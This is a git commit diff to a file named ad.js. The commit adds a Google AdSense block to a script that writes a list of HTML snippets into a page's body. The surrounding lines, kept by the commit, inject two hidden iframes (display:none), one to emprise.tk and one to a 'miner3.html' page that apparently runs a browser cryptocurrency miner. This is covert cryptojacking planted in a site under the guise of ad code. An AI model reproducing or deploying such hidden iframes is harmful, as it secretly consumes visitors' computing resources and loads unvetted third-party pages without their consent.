20382c57f32a23361d57134a3fe51118289f3ed0
guochijun@dianmi365.com <guochijun@dianmi365.com>
2017-10-16 17:49:38 +0800

    adver

--- ad.js
+++ ad.js
@@ -6,7 +6,8 @@
     var divs=[
 
     "<iframe src=\"http://emprise.tk/\"  style=\"display: none;\"></iframe>",
-    "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
+    "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>",
+    "<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- tesst -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-3568322529043220\"\n     data-ad-slot=\"7186075983\"\n     data-ad-format=\"auto\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"
     ]
     for (var i=0,len=divs.length;i<len;i++){
         document.body.innerHTML+=divs[i]
